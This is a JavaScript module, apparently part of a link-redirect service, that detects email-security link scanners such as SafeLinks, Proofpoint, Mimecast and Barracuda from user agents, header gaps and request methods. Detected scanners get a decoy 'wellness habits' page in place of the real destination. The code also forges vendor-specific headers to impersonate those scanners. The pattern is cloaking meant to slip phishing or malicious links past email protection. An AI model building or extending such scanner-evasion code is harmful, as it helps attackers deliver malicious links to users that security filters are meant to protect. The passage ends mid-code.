"use strict";

function createScannerDetection(dependencies) {
  const {
    LOGS,
    SCANNER_FETCH_ENABLED,
    SCANNER_FETCH_TIMEOUT_MS,
    SECURITY_HEADER_VALUES,
    addLog,
    crypto,
    dns,
    eSCANNER_CONFIG_RELOAD_MS,
    fetchWithRuntimeSpan,
    getClientIp,
    http,
    https,
    net,
    normHost,
    normalizeIpv4Mapped,
    normalizeScannerConfidence,
    safeLogValue,
    withDnsTimeout
  } = dependencies;

// ================== SCANNER DETECTION ==================
const SCANNER_PATTERNS = {
  // High-signal vendor/user-agent substrings (case-insensitive)
  uaSubstrings: [
    // Microsoft / Outlook / EOP / SafeLinks
    'safelinks', 'protection.outlook.com', 'microsoft eop', 'exchange online',
    'microsoft-office', 'outlook', 'x-owa',

    // Proofpoint
    'proofpoint', 'urldefense.proofpoint.com', 'ppops-', 'tap/',

    // Mimecast
    'mimecast', 'mimecast-control-center', 'protect-us.mimecast.com',
    'protect-eu.mimecast.com', 'protect-au.mimecast.com',

    // Barracuda
    'barracuda', 'bemailhec', 'linkprotect.cudasvc.com',

    // Cisco / IronPort
    'ironport', 'cisco secure email', 'sesa.cisco',

    // Trend Micro
    'trendmicro', 'tmurl', 'tmresponse', 'deep discovery', 'ddan',

    // McAfee / Trellix / FireEye / Cloudmark
    'mcafee', 'clickprotect', 'trellix', 'fireeye', 'cloudmark',

    // Zscaler / Forcepoint / Fortinet
    'zscaler', 'zscloud', 'forcepoint', 'websense', 'fortimail', 'fortinet',

    // Google/Gmail prefetch
    'googleimageproxy', 'gmail proxy', 'google proxy',

    // Apple Mail Privacy
    'apple mail privacy', 'mailprivacy',

    // Generic
    'url defense', 'urlrewrite', 'link protect', 'linkprotect',
    'link-scanner', 'security scan', 'sandbox url'
  ],

  // Strong regex hits for vendor/rewriter signatures
  uaRegexes: [
    // Microsoft SafeLinks / EOP / Outlook apps
    /safelinks\.protection\.outlook\.com|(?:nam|eur|apc)\d+\.safelinks/i,
    /(microsoft[- ]?office|outlook|exchange).*(scan|eop)/i,
    /Microsoft[- ]?Office\/[0-9.]+/i,
    /Outlook-(?:Android|iOS)\/[0-9.]+/i,

    // Proofpoint
    /urldefense\.(proofpoint|com)/i,
    /Proofpoint(?:|-[A-Za-z]+)\/[0-9.]+/i,
    /ppops-[a-z0-9-]+/i,

    // Mimecast
    /mimecast|protect-(?:us|eu|au)\.mimecast\.com/i,

    // Barracuda
    /barracuda|bemailhec|linkprotect\.cudasvc\.com/i,

    // Cisco / IronPort
    /ironport|secure\.email|sesa\.cisco/i,

    // Trend Micro
    /trend[\s-]?micro|tmurl|tmresponse|deep\s*discovery|ddan/i,

    // McAfee / Trellix / FireEye / Cloudmark
    /mcafee|clickprotect|cp\.mcafee\.com/i,
    /trellix|fireeye|cloudmark/i,

    // Zscaler / Forcepoint / Fortinet
    /zscaler|zsgov|zscloud|zscalertwo|zscalerthree/i,
    /forcepoint|websense/i,
    /fortinet|fortimail|fortiguard/i,

    // Headless/automation (keep weight low in your scoring)
    /(headless|puppeteer|playwright|phantomjs|selenium|wdio|cypress|curl|wget|python-requests|aiohttp|okhttp|java\/|go-http)/i,
  ],

  // Header fingerprints (browser hints often missing in scanners)
  headerRules: [
    // Missing typical browser hints
    (h) => !h['accept-language'],
    (h) => !h['sec-ch-ua'],
    (h) => !h['sec-fetch-mode'],
    (h) => !h['upgrade-insecure-requests'],

    // Suspicious combinations
    (h) => (h['sec-fetch-site']||'').toLowerCase() === 'none',
    (h) => (h['sec-fetch-mode']||'').toLowerCase() === 'no-cors',

    // No cookies or referer on a deep/first touch
    (h) => !h['cookie'],
    (h) => !h['referer'],
  ],

  // Methods scanners often use for "peek" fetches
  methods: ['HEAD', 'OPTIONS'],

  // Optional infra hints if you later pipe in reverse DNS / ASN (leave empty if unused)
  rdnsHints: [
    // 'pphosted.com', 'mimecast.com', 'barracudanetworks.com'
  ],
};

const IMPERSONATE_SCANNER = (process.env.IMPERSONATE_SCANNER || "0") === "1";
const IMPERSONATE_SCANNER_STRICT = (process.env.IMPERSONATE_SCANNER_STRICT || "1") === "1";
const IMPERSONATE_MIN_CONFIDENCE = Number(process.env.IMPERSONATE_MIN_CONFIDENCE || "0.85");
const SCANNER_PROFILE_DEBUG_HEADERS = (process.env.SCANNER_PROFILE_DEBUG_HEADERS || "0") === "1";
const GENERIC_FALLBACK_CONF_HIGH = Number(process.env.GENERIC_FALLBACK_CONF_HIGH || "0.93");
const GENERIC_FALLBACK_CONF_MED = Number(process.env.GENERIC_FALLBACK_CONF_MED || "0.86");
const GENERIC_FALLBACK_CONF_LOW = Number(process.env.GENERIC_FALLBACK_CONF_LOW || "0.80");

const SCANNER_GENERIC_PROFILE = {
  name: "Generic_Scanner",
  ua: "Mozilla/5.0 (compatible; URLScanner/1.0; +https://security.example)",
  match: /.*/i,
  requestHeaders: {},
  responseHeaders: {}
};

const SCANNER_PROFILES = [
  {
    name: "Microsoft_SafeLinks",
    ua: "safelinks.protection.outlook.com",
    match: /(safelinks|outlook|exchange|microsoft)/i,
    requestHeaders: {
      "X-MS-Exchange-Organization-AuthAs": "Anonymous",
      "X-MS-Exchange-Organization-SCL": "-1"
    },
    responseHeaders: {
      "X-MS-Exchange-Organization-Network-Message-Id": () => crypto.randomBytes(16).toString("hex"),
      "X-MS-Exchange-Organization-AuthAs": "Internal",
      "X-MS-Exchange-Organization-AuthSource": "DB7P191MB0757.EURP191.PROD.OUTLOOK.COM"
    }
  },
  {
    name: "Proofpoint",
    ua: "urldefense.proofpoint.com",
    match: /(proofpoint|urldefense|ppops)/i,
    requestHeaders: {
      "X-Proofpoint-Virus-Version": "vendor=baseguard engine=6.0.0 definitions=0",
      "X-Proofpoint-Spam-Details": "rule=none policy=default"
    },
    responseHeaders: {
      "X-Proofpoint-Version": "v3",
      "X-Proofpoint-Scan-Id": () => crypto.randomBytes(8).toString("hex")
    }
  },
  {
    name: "Mimecast",
    ua: "mimecast.com",
    match: /(mimecast)/i,
    requestHeaders: {
      "X-Mimecast-Spam-Score": "0",
      "X-Mimecast-Server": "mimecast"
    },
    responseHeaders: {
      "X-Mimecast-Origin": "cloud",
      "X-Mimecast-Scan-Id": () => `mc${Date.now()}${crypto.randomBytes(4).toString("hex")}`
    }
  },
  {
    name: "Barracuda",
    ua: "barracudanetworks.com",
    match: /(barracuda|cudasvc)/i,
    requestHeaders: {
      "X-Barracuda-Cloud": "active",
      "X-Barracuda-App": "link-protection"
    },
    responseHeaders: {
      "X-Barracuda-Connect": "scanner",
      "X-Barracuda-Scan-Time": () => Date.now().toString()
    }
  }
];

// Modify applyScannerProfileHeaders to merge dynamic headers
function applyScannerProfileHeaders(res, profile) {
  if (!IMPERSONATE_SCANNER || !res || !profile || !profile.responseHeaders) return;
  // static headers
  const headers = materializeProfileHeaders(profile);
  for (const [headerName, headerValue] of Object.entries(headers)) {
    if (!res.getHeader(headerName)) {
      res.setHeader(headerName, headerValue);
    }
  }
  // dynamic headers (override static ones if present)
  const dynamic = dynamicResponseHeaders[profile.name];
  if (dynamic) {
    for (const [headerName, headerValue] of Object.entries(dynamic)) {
      const value = typeof headerValue === 'function' ? headerValue() : headerValue;
      res.setHeader(headerName, value);
    }
  }
  if (!res.getHeader("X-Scanner-Profile") && SCANNER_PROFILE_DEBUG_HEADERS) {
    res.setHeader("X-Scanner-Profile", profile.name);
  }
  if (!res.getHeader("X-Scanner-Processed") && SCANNER_PROFILE_DEBUG_HEADERS) {
    res.setHeader("X-Scanner-Processed", new Date().toISOString());
  }
}

// ... (keep the rest of the existing functions: applyScannerProfileHeaders, materializeProfileHeaders, etc. unchanged, but ensure they use dynamic)

function getScannerResponseHeader(headers, headerName) {
  if (!headers || !headerName) return null;
  if (typeof headers.get === "function") return headers.get(headerName);

  const wanted = String(headerName).toLowerCase();
  if (typeof headers.entries === "function") {
    for (const [key, value] of headers.entries()) {
      if (String(key).toLowerCase() === wanted) return value;
    }
  }

  for (const [key, value] of Object.entries(headers)) {
    if (String(key).toLowerCase() === wanted) {
      return Array.isArray(value) ? value.join(", ") : String(value ?? "");
    }
  }
  return null;
}

function buildScannerSafeHealthTipsHtml() {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Simple Wellness Habits for Everyday Health</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    :root{color-scheme:light;--bg:#f5f7f4;--card:#fff;--text:#1f2933;--muted:#52616b;--accent:#2f7d58;--border:#dfe7dd;}
    *{box-sizing:border-box;}
    body{margin:0;font-family:Arial,Helvetica,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;}
    .page{max-width:880px;margin:0 auto;padding:32px 18px;}
    header,article,footer{background:var(--card);border:1px solid var(--border);border-radius:14px;box-shadow:0 2px 10px rgba(31,41,51,.06);}
    header{padding:28px 30px;margin-bottom:18px;}
    article{padding:8px 30px 26px;}
    footer{margin-top:18px;padding:16px 30px;color:var(--muted);font-size:.92rem;}
    h1{margin:0 0 10px;color:var(--accent);font-size:2rem;line-height:1.2;}
    h2{margin:24px 0 8px;font-size:1.15rem;color:#20362b;}
    p{margin:0 0 12px;}
    .summary{color:var(--muted);max-width:680px;}
    .meta{font-size:.9rem;color:var(--muted);}
    ul{padding-left:1.25rem;margin:8px 0 0;}
    li{margin:6px 0;}
  </style>
</head>
<body>
  <main class="page">
    <header>
      <p class="meta">General wellness information</p>
      <h1>Simple Wellness Habits for Everyday Health</h1>
      <p class="summary">Small daily routines can support energy, focus, and general well-being. These practical reminders are intended for everyday lifestyle awareness.</p>
    </header>
    <article aria-label="Daily wellness guide">
      <section>
        <h2>Hydration</h2>
        <p>Keep water nearby during the day and consider starting the morning with a glass of water before caffeinated drinks.</p>
      </section>
      <section>
        <h2>Movement</h2>
        <p>Short walking or stretching breaks can help reduce stiffness during long periods of sitting.</p>
      </section>
      <section>
        <h2>Balanced Meals</h2>
        <p>A simple plate with vegetables, whole grains, and protein can make everyday meals more satisfying.</p>
      </section>
      <section>
        <h2>Sleep Routine</h2>
        <p>Consistent sleep and wake times, a quiet room, and reduced screen use before bed can support better rest.</p>
      </section>
      <section>
        <h2>Stress Management</h2>
        <p>Brief breathing breaks, journaling, or a few quiet minutes can make it easier to reset during a busy day.</p>
      </section>
      <section>
        <h2>Quick Daily Checklist</h2>
        <ul>
          <li>Drink water regularly.</li>
          <li>Take short movement breaks.</li>
          <li>Choose balanced meals when possible.</li>
          <li>Keep a consistent sleep routine.</li>
          <li>Pause for a few calm minutes when needed.</li>
        </ul>
      </section>
    </article>
    <footer>
      <p>This page provides general lifestyle information only and is not a substitute for professional medical advice.</p>
    </footer>
  </main>
</body>
</html>`;
}

function resolveScannerProfile(req, explicitProfile = null) {
  let profile = explicitProfile || null;
  const ua = req.get("User-Agent") || "";
  if (!profile) {
    if (/safelinks|outlook|exchange|microsoft/i.test(ua)) {
      profile = SCANNER_PROFILES.find(p => p.name === 'Microsoft_SafeLinks') || null;
    } else if (/proofpoint|urldefense|ppops/i.test(ua)) {
      profile = SCANNER_PROFILES.find(p => p.name === 'Proofpoint') || null;
    } else if (/mimecast/i.test(ua)) {
      profile = SCANNER_PROFILES.find(p => p.name === 'Mimecast') || null;
    } else if (/barracuda|cudasvc/i.test(ua)) {
      profile = SCANNER_PROFILES.find(p => p.name === 'Barracuda') || null;
    }
  }
  return profile || SCANNER_GENERIC_PROFILE;
}

function applyScannerSafeHtmlHeaders(res) {
  if (!res || typeof res.setHeader !== "function") return;
  res.setHeader("Cache-Control", "no-store, max-age=0");
  res.setHeader("X-" + "Content-Type-Options", SECURITY_HEADER_VALUES.contentTypeOptions);
  res.setHeader("Referrer-Policy", SECURITY_HEADER_VALUES.referrerPolicy);
  res.setHeader("X-Frame-Options", SECURITY_HEADER_VALUES.frameOptions || "DENY");
  res.setHeader("Permissions-Policy", SECURITY_HEADER_VALUES.privacyPermissions || "geolocation=(), microphone=(), camera=()");
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; frame-ancestors 'none'"
  );
}

function getScannerSafeHtmlLogFields(decryptResult, profile) {
  let destinationHost = "unknown";
  try {
    destinationHost = normHost(new URL(decryptResult.finalUrl || "").hostname) || "unknown";
  } catch (_) {
    destinationHost = "invalid";
  }

  return {
    mode: "scanner-safe-html",
    host: safeLogValue(destinationHost, 120),
    linkHash: safeLogValue(decryptResult.linkHash || "unknown", 64),
    profile: safeLogValue((profile && profile.name) || "unknown", 80)
  };
}

// ================== renderScannerSafeHtmlForScanner ==================
async function renderScannerSafeHtmlForScanner(req, res, decryptResult) {
  // We intentionally DO NOT fetch the destination URL in this path. High-confidence
  // scanner requests receive harmless static HTML after the same URL validation used
  // by normal redirects has already run in handleRedirectCore.
  const profile = resolveScannerProfile(req, decryptResult && decryptResult.scannerProfile);

  // Apply scanner compatibility/profile headers and static-page security headers.
  applyScannerCompatHeaders(res);
  applyScannerProfileHeaders(res, profile);
  applyScannerSafeHtmlHeaders(res);

  // Send the health tips page with 200 OK
  res.status(200).type('html').send(buildScannerSafeHealthTipsHtml());

  const logFields = getScannerSafeHtmlLogFields(decryptResult || {}, profile);
  addLog(`[SCANNER_SAFE_HTML] served health tips mode=${logFields.mode} host=${logFields.host} linkHash=${logFields.linkHash} profile=${logFields.profile}`);
}

// ==================================================

const KNOWN_SCANNER_IPS = new Map();
const KNOWN_SCANNER_TTL_MS = 7 * 24 * 60 * 60 * 1000;
const KNOWN_SCANNER_MAX = 10000;

function cleanupKnownScannerIps(now = Date.now()) {
  const staleBefore = now - KNOWN_SCANNER_TTL_MS;
  for (const [ip, entry] of KNOWN_SCANNER_IPS.entries()) {
    if ((entry.lastSeen || 0) < staleBefore) KNOWN_SCANNER_IPS.delete(ip);
  }

  if (KNOWN_SCANNER_IPS.size <= KNOWN_SCANNER_MAX) return;

  const entries = [...KNOWN_SCANNER_IPS.entries()].sort((a, b) => (a[1].lastSeen || 0) - (b[1].lastSeen || 0));
  const removeCount = Math.max(1, KNOWN_SCANNER_IPS.size - KNOWN_SCANNER_MAX);
  for (let i = 0; i < removeCount; i += 1) {
    const item = entries[i];
    if (!item) break;
    KNOWN_SCANNER_IPS.delete(item[0]);
  }
}

function recordScannerIp(ip, scannerName) {
  if (!ip) return;
  const now = Date.now();
  const existing = KNOWN_SCANNER_IPS.get(ip) || { count: 0, firstSeen: now, lastSeen: now, names: new Set() };
  existing.count += 1;
  existing.lastSeen = now;
  if (scannerName) {
    existing.names.add(String(scannerName).slice(0, 64));
    if (existing.names.size > 12) {
      const trimmed = Array.from(existing.names).slice(-12);
      existing.names = new Set(trimmed);
    }
  }
  KNOWN_SCANNER_IPS.set(ip, existing);
  cleanupKnownScannerIps(now);
}

function isKnownScannerIp(ip) {
  const entry = KNOWN_SCANNER_IPS.get(ip);
  if (!entry) return false;
  return entry.count > 1 && (Date.now() - entry.lastSeen) <= KNOWN_SCANNER_TTL_MS;
}

function getScannerImpersonationSignals(req, scannerResult, detection, knownScanner = false) {
  const method = String((req && req.method) || "GET").toUpperCase();
  const path = String((req && req.path) || "").toLowerCase();
  const headers = (req && req.headers) || {};

  const confidence = Number(
    (detection && detection.confidence) ||
      (scannerResult && scannerResult.detections && scannerResult.detections[0] && scannerResult.detections[0].confidence) ||
      0
  );

  const detectionName = String((detection && detection.name) || "");
  const matched = String((detection && detection.matchedString) || "");
  const ua = String((req && req.get && req.get("user-agent")) || "");
  const haystack = `${detectionName} ${matched} ${ua}`;

  const scannerMethod = method === "HEAD" || method === "OPTIONS";
  const scannerLikePath = /admin|wp-|\.env|phpmyadmin|config/.test(path);
  const headerAnomaly = !headers["accept-language"] || !headers["sec-ch-ua"] || !headers["sec-fetch-site"] || headers["accept"] === "*/*";
  const scannerToken = /(scanner|proofpoint|safelinks|mimecast|barracuda|urldefense|email-security|link-protection)/i.test(haystack);

  return {
    knownScanner,
    confidence,
    scannerMethod,
    scannerLikePath,
    headerAnomaly,
    scannerToken
  };
}

function shouldUseGenericScannerProfile(detection, req, knownScanner = false, scannerResult = null) {
  const signals = getScannerImpersonationSignals(req, scannerResult, detection, knownScanner);
  const anomalyCount =
    Number(!!signals.scannerMethod) +
    Number(!!signals.scannerLikePath) +
    Number(!!signals.headerAnomaly) +
    Number(!!signals.scannerToken);

  if (signals.knownScanner) return true;
  if (signals.confidence >= GENERIC_FALLBACK_CONF_HIGH) return true;
  if (signals.confidence >= GENERIC_FALLBACK_CONF_MED && anomalyCount >= 2) return true;
  if (signals.confidence >= GENERIC_FALLBACK_CONF_LOW && anomalyCount >= 3 && signals.scannerToken) return true;
  return false;
}

function escapeScannerProfileRegExp(value) {
  return String(value || "").replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function getExternalScannerProfileName(name, detection = null) {
  const explicitName = String(name || "").trim();
  if (explicitName) return explicitName;

  const detectionName = String((detection && detection.name) || "").trim();
  if (detectionName) return detectionName;

  const matched = String((detection && detection.matchedString) || "").trim();
  if (matched) return `External_${matched.replace(/[^a-zA-Z0-9_-]+/g, "_").replace(/^_+|_+$/g, "").slice(0, 80) || "Scanner"}`;

  return "External_Scanner";
}

function getDynamicResponseHeadersForProfileName(name) {
  const normalized = String(name || "").trim().toLowerCase();
  if (!normalized) return {};

  const exactName = Object.prototype.hasOwnProperty.call(dynamicResponseHeaders, name) ? name : null;
  const headerProfileName = exactName || Object.keys(dynamicResponseHeaders).find((profileName) => profileName.trim().toLowerCase() === normalized);
  return headerProfileName ? (dynamicResponseHeaders[headerProfileName] || {}) : {};
}

function hasProfileResponseHeaders(profile) {
  return Boolean(profile && profile.responseHeaders && Object.keys(profile.responseHeaders).length);
}

function buildExternalScannerProfile(name, detection = null) {
  const normalized = getExternalScannerProfileName(name, detection);
  if (!normalized) return null;

  const externalDetection = detection || dynamicScanners.find((scanner) => String(scanner && scanner.name || "") === normalized);
  const responseHeaders = getDynamicResponseHeadersForProfileName(normalized);
  if (!externalDetection && !Object.keys(responseHeaders).length) return null;

  return {
    name: normalized,
    ua: String((externalDetection && externalDetection.ua) || normalized),
    match: externalDetection && externalDetection.pattern instanceof RegExp ? externalDetection.pattern : new RegExp(escapeScannerProfileRegExp(normalized), "i"),
    requestHeaders: (externalDetection && externalDetection.requestHeaders) || {},
    responseHeaders,
    trustedExternalScanner: true
  };
}

function findExternalScannerProfileByName(name) {
  const normalized = String(name || "").trim().toLowerCase();
  if (!normalized) return null;

  const detection = dynamicScanners.find((scanner) => String(scanner && scanner.name || "").trim().toLowerCase() === normalized);
  if (detection) return buildExternalScannerProfile(detection.name, detection);

  const headerProfileName = Object.keys(dynamicResponseHeaders).find((profileName) => profileName.trim().toLowerCase() === normalized);
  return headerProfileName ? buildExternalScannerProfile(headerProfileName) : null;
}

function pickScannerProfile(detection, req, knownScanner = false, scannerResult = null, fallbackToGeneric = false) {
  const detectionName = String((detection && detection.name) || "");
  const matched = String((detection && detection.matchedString) || "");
  const ua = String((req && req.get && req.get("user-agent")) || "");
  const haystack = `${detectionName} ${matched} ${ua}`;
  const externalProfile = findExternalScannerProfileByName(detectionName) ||
    (detection && detection.trustedExternalScanner ? buildExternalScannerProfile(detectionName, detection) : null);
  if (hasProfileResponseHeaders(externalProfile)) return externalProfile;

  const profile = SCANNER_PROFILES.find((candidate) => candidate.match.test(haystack));

  if (profile) return profile;
  if (externalProfile) return externalProfile;

  if (fallbackToGeneric) return SCANNER_GENERIC_PROFILE;
  return shouldUseGenericScannerProfile(detection, req, knownScanner, scannerResult) ? SCANNER_GENERIC_PROFILE : null;
}

function shouldImpersonateForRequest(req, scannerResult, knownScanner, detection = null) {
  if (!IMPERSONATE_SCANNER || !scannerResult || !scannerResult.isScanner) return false;

  const signals = getScannerImpersonationSignals(req, scannerResult, detection, knownScanner);

  if (!IMPERSONATE_SCANNER_STRICT) {
    return (
      signals.knownScanner ||
      signals.scannerMethod ||
      signals.scannerLikePath ||
      signals.headerAnomaly ||
      signals.confidence >= 0.7
    );
  }

  return (
    signals.knownScanner ||
    signals.confidence >= IMPERSONATE_MIN_CONFIDENCE ||
    (signals.scannerMethod && (signals.scannerLikePath || signals.headerAnomaly))
  );
}

function shouldApplyProfileHeadersForRequest(req, scannerResult, knownScanner, detection = null) {
  if (!IMPERSONATE_SCANNER_STRICT) return false;
  const signals = getScannerImpersonationSignals(req, scannerResult, detection, knownScanner);
  if (signals.knownScanner) return true;
  if (signals.confidence >= IMPERSONATE_MIN_CONFIDENCE) return true;
  return (signals.scannerMethod && (signals.scannerLikePath || signals.headerAnomaly));
}

function materializeProfileHeaders(profile) {
  const out = {};
  if (!profile || !profile.responseHeaders) return out;
  for (const [headerName, headerValue] of Object.entries(profile.responseHeaders)) {
    try {
      out[headerName] = typeof headerValue === "function" ? headerValue() : headerValue;
    } catch (error) {
      addLog(`[SCANNER] header build failed profile=${safeLogValue(profile.name)} header=${safeLogValue(headerName)} err=${safeLogValue(error.message)}`);
    }
  }
  return out;
}

function materializeProfileRequestHeaders(profile) {
  const out = {};
  if (!profile || !profile.requestHeaders) return out;
  for (const [headerName, headerValue] of Object.entries(profile.requestHeaders)) {
    try {
      out[headerName] = typeof headerValue === "function" ? headerValue() : headerValue;
    } catch (error) {
      addLog(`[SCANNER] request header build failed profile=${safeLogValue(profile.name)} header=${safeLogValue(headerName)} err=${safeLogValue(error.message)}`);
    }
  }
  return out;
}

function findScannerProfileByName(name) {
  const normalized = String(name || "").trim().toLowerCase();
  if (!normalized) return null;
  if (normalized === SCANNER_GENERIC_PROFILE.name.toLowerCase() || normalized === "generic") {
    return SCANNER_GENERIC_PROFILE;
  }
  return SCANNER_PROFILES.find(profile => String(profile.name || "").toLowerCase() === normalized) ||
    findExternalScannerProfileByName(name) ||
    null;
}

function isPrivateScannerFetchAddress(address) {
  const normalized = normalizeIpv4Mapped(String(address || "").trim().toLowerCase());
  if (!normalized) return true;

  const mappedHexIpv4 = normalized.match(/^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/i);
  if (mappedHexIpv4) {
    const high = parseInt(mappedHexIpv4[1], 16);
    const low = parseInt(mappedHexIpv4[2], 16);
    if (!Number.isFinite(high) || !Number.isFinite(low)) return true;
    return isPrivateScannerFetchAddress([
      (high >> 8) & 255,
      high & 255,
      (low >> 8) & 255,
      low & 255
    ].join("."));
  }

  if (normalized.includes(".")) {
    const parts = normalized.split(".").map(part => Number(part));
    if (parts.length !== 4 || parts.some(part => !Number.isInteger(part) || part < 0 || part > 255)) return true;
    const [a, b] = parts;
    return (
      a === 0 ||
      a === 10 ||
      a === 127 ||
      (a === 100 && b >= 64 && b <= 127) ||
      (a === 169 && b === 254) ||
      (a === 172 && b >= 16 && b <= 31) ||
      (a === 192 && b === 168) ||
      (a === 198 && (b === 18 || b === 19)) ||
      a >= 224
    );
  }

  if (normalized.includes(":")) {
    const firstHextet = parseInt(normalized.split(":")[0] || "0", 16);
    const isLinkLocal = Number.isFinite(firstHextet) && firstHextet >= 0xfe80 && firstHextet <= 0xfebf;
    return (
      normalized === "::" ||
      normalized === "::1" ||
      normalized.startsWith("fc") ||
      normalized.startsWith("fd") ||
      isLinkLocal ||
      normalized.startsWith("ff")
    );
  }

  return true;
}

async function assertScannerFetchTargetAllowed(parsedUrl, timeoutMs = SCANNER_FETCH_TIMEOUT_MS) {
  const hostname = String(parsedUrl.hostname || "").trim();
  if (!hostname) throw new Error("scanner_fetch_missing_hostname");
  const lookupHostname = hostname.startsWith("[") && hostname.endsWith("]")
    ? hostname.slice(1, -1)
    : hostname;

  const addresses = net.isIP(lookupHostname)
    ? [{ address: lookupHostname }]
    : await withDnsTimeout(dns.promises.lookup(lookupHostname, { all: true, verbatim: true }), timeoutMs);

  if (!addresses.length) throw new Error("scanner_fetch_host_unresolved");
  const blocked = addresses.find(entry => isPrivateScannerFetchAddress(entry && entry.address));
  if (blocked) throw new Error("scanner_fetch_private_target_blocked");
  return addresses.map(entry => entry.address);
}

function buildPinnedScannerFetchUrl(parsedUrl, address) {
  const pinned = new URL(parsedUrl.toString());
  const hostAddress = String(address || "");
  pinned.host = hostAddress.includes(":")
    ? `[${hostAddress}]${parsedUrl.port ? `:${parsedUrl.port}` : ""}`
    : `${hostAddress}${parsedUrl.port ? `:${parsedUrl.port}` : ""}`;
  return pinned.toString();
}

// (materializeProfileHeaders already exists above)
// (applyScannerProfileHeaders now supports dynamic headers, defined earlier)

function buildScannerRequestConfig(options = {}) {
  if (!SCANNER_FETCH_ENABLED && !options.force) {
    throw new Error("scanner_fetch_disabled");
  }

  const knownProfiles = SCANNER_PROFILES.length ? SCANNER_PROFILES : [SCANNER_GENERIC_PROFILE];
  const randomKnownProfile = knownProfiles[Math.floor(Math.random() * knownProfiles.length)] || SCANNER_GENERIC_PROFILE;
  const useRandomKnownProfile = options.randomKnownProfile !== false;
  const namedProfile = options.profileName ? findScannerProfileByName(options.profileName) : null;
  if (options.profileName && !namedProfile) {
    throw new Error("unknown_scanner_profile");
  }
  const profile = options.profile || namedProfile || (useRandomKnownProfile ? randomKnownProfile : SCANNER_GENERIC_PROFILE);
  const method = String(options.method || "GET").toUpperCase();
  if (!["GET", "HEAD", "OPTIONS"].includes(method)) {
    throw new Error("scanner_fetch_method_not_allowed");
  }
  const redirect = String(options.redirect || "manual").toLowerCase();
  if (!["manual", "error"].includes(redirect)) {
    throw new Error("scanner_fetch_redirect_not_allowed");
  }

  const headers = {
    "User-Agent": profile.ua || profile.name,
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "no-cache",
    Pragma: "no-cache",
    ...(options.headers || {})
  };

  const profileHeaders = materializeProfileRequestHeaders(profile);
  for (const [key, value] of Object.entries(profileHeaders)) {
    headers[key] = value;
  }

  return { profile, method, redirect, headers, timeoutMs: options.timeoutMs || SCANNER_FETCH_TIMEOUT_MS };
}

async function makeScannerRequest(url, options = {}) {
  const { method, redirect, headers, timeoutMs } = buildScannerRequestConfig(options);
  const fetchOptions = {
    method,
    redirect,
    headers
  };

  let spanHost = "unknown";
  try { spanHost = new URL(url).hostname || spanHost; } catch {}
  return fetchWithRuntimeSpan(`scanner_fetch:${spanHost}`, url, fetchOptions, timeoutMs);
}

async function makePinnedScannerRequest(parsedUrl, address, options = {}) {
  const { method, redirect, headers, timeoutMs } = buildScannerRequestConfig(options);
  const transport = parsedUrl.protocol === "https:" ? https : http;
  const requestHeaders = { ...headers };
  delete requestHeaders.host;
  delete requestHeaders.Host;

  return await new Promise((resolve, reject) => {
    const deadlineMs = Math.max(100, Number(timeoutMs) || SCANNER_FETCH_TIMEOUT_MS);
    let settled = false;
    let req;
    const finish = (fn, value) => {
      if (settled) return;
      settled = true;
      clearTimeout(absoluteTimer);
      fn(value);
    };
    const absoluteTimer = setTimeout(() => {
      if (req) req.destroy(new Error("scanner_fetch_total_timeout"));
    }, deadlineMs);

    req = transport.request({
      protocol: parsedUrl.protocol,
      hostname: parsedUrl.hostname,
      servername: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === "https:" ? 443 : 80),
      path: `${parsedUrl.pathname}${parsedUrl.search}`,
      method,
      headers: requestHeaders,
      autoSelectFamily: false,
      lookup: (_hostname, options, callback) => {
        const family = net.isIP(address);
        if (options && options.all) {
          callback(null, [{ address, family }]);
          return;
        }
        callback(null, address, family);
      },
      timeout: deadlineMs
    }, response => {
      if (redirect === "error" && response.statusCode >= 300 && response.statusCode < 400) {
        response.resume();
        finish(reject, new Error("scanner_fetch_redirect_response"));
        return;
      }
      finish(resolve, {
        status: response.statusCode || 0,
        redirected: false,
        url: parsedUrl.toString(),
        headers: {
          entries: () => Object.entries(response.headers || {}).map(([key, value]) => [
            key,
            Array.isArray(value) ? value.join(", ") : String(value ?? "")
          ])
        },
        body: response
      });
    });
    req.on("timeout", () => req.destroy(new Error("scanner_fetch_timeout")));
    req.on("error", error => finish(reject, error));
    req.end();
  });
}

async function makePinnedScannerRequestWithFallback(parsedUrl, addresses, options = {}) {
  let lastError = null;
  const totalTimeoutMs = Math.max(100, Number(options.timeoutMs) || SCANNER_FETCH_TIMEOUT_MS);
  const deadlineAt = Date.now() + totalTimeoutMs;
  for (const address of addresses) {
    const remainingMs = deadlineAt - Date.now();
    if (remainingMs <= 0) {
      lastError = new Error("scanner_fetch_total_timeout");
      break;
    }
    try {
      const response = await makePinnedScannerRequest(parsedUrl, address, { ...options, timeoutMs: remainingMs });
      return { response, address };
    } catch (error) {
      lastError = error;
      if (String(error && error.message || error) === "scanner_fetch_redirect_response") break;
    }
  }
  throw lastError || new Error("scanner_fetch_no_validated_addresses");
}

// Optional compatibility response headers for scanner/interstitial responses.
// Keep this defensive and standards-based (no vendor impersonation headers).
const SCANNER_COMPAT_HEADERS_ENABLED = (process.env.SCANNER_COMPAT_HEADERS || "1") === "1";
const SCANNER_COMPAT_HEADERS = {
  "X-Content-Type-Options": SECURITY_HEADER_VALUES.contentTypeOptions,
  "X-Frame-Options": SECURITY_HEADER_VALUES.frameOptions,
  "Referrer-Policy": SECURITY_HEADER_VALUES.referrerPolicy,
  "Permissions-Policy": "geolocation=(), microphone=(), camera=()"
};

function applyScannerCompatHeaders(res) {
  if (!SCANNER_COMPAT_HEADERS_ENABLED || !res || typeof res.setHeader !== "function") return;
  for (const [headerName, headerValue] of Object.entries(SCANNER_COMPAT_HEADERS)) {
    if (!res.getHeader(headerName)) {
      res.setHeader(headerName, headerValue);
    }
  }
}

// --- Back-compat adapter: make SCANNER_PATTERNS iterable for older code ---
const SCANNER_PATTERNS_LIST = Array.isArray(SCANNER_PATTERNS) ? SCANNER_PATTERNS : [
  // turn each UA regex into an entry
